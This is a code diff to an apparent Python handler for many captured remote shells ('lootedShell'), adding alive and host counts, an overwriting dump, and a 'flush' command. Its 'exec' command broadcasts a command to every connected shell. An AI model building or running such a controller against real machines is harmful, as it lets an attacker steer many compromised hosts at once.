@@ -23,8 +23,8 @@ def recv(sck, uuid):
             lootedShell[uuid]["time"] = time.time()
             lootedShell[uuid]["history"].extend(sck.recv(1024))
     except Exception:
-        lootedShell[uuid]["died"] = True
-        pass
+        if uuid in lootedShell:
+            lootedShell[uuid]["died"] = True
 
 
 def send(cmd):
@@ -43,13 +43,16 @@ def send(cmd):
 
 
 def info(placeholder):
-    print(f"[*] {len(lootedShell)} shells in total")
+    count = 0
+    hosts = set()
     for i in lootedShell:
         if lootedShell[i]["died"]:
-            status = "died"
+            pass
         else:
-            status = "alive"
-        print(f"[*] addr: {lootedShell[i]['addr']}, status: {status}")
+            count += 1
+            hosts.add(lootedShell[i]['addr'][0])
+            print(f"[*] {lootedShell[i]['addr']}")
+    print(f"[*] {len(lootedShell)} shells in total, {count} alive, {len(hosts)} hosts")
 
 
 def dump(filename):
@@ -69,20 +72,29 @@ def dump(filename):
         print(f"[*] No filename specified, dumped to {filename}")
     else:
         print(f"[*] Dumped to {filename}")
-    f = open(filename, "a")
+    f = open(filename, "w")
     f.write(json.dumps(result))
     f.close()
     print("[*] Dump complete")
         
 
+def flush(placeholder):
+    dump("")
+    for i in list(lootedShell):
+        if lootedShell[i]["died"]:
+            lootedShell.pop(i)
+        else:
+            lootedShell[i]["history"] = bytearray()
+    print("[*] Flush success")
+
 
 def help():
     print("[*] Help:")
     print("[1] exec [cmd]")
-    print("    command after exec will be send to all shells\n")
+    print("    Command after exec will be send to all shells\n")
     print("[2] info")
     print("    Get curr shell infos\n")
-    print("[3] dump [filename]")
+    print("[3] dump (filename)")
     print("    Dump all result to file")
 
 
@@ -92,7 +104,8 @@ def main(lport):
     mapping = {
         "exec": send,
         "info": info,
-        "dump": dump
+        "dump": dump,
+        "flush": flush
     }
     while True:
         try:
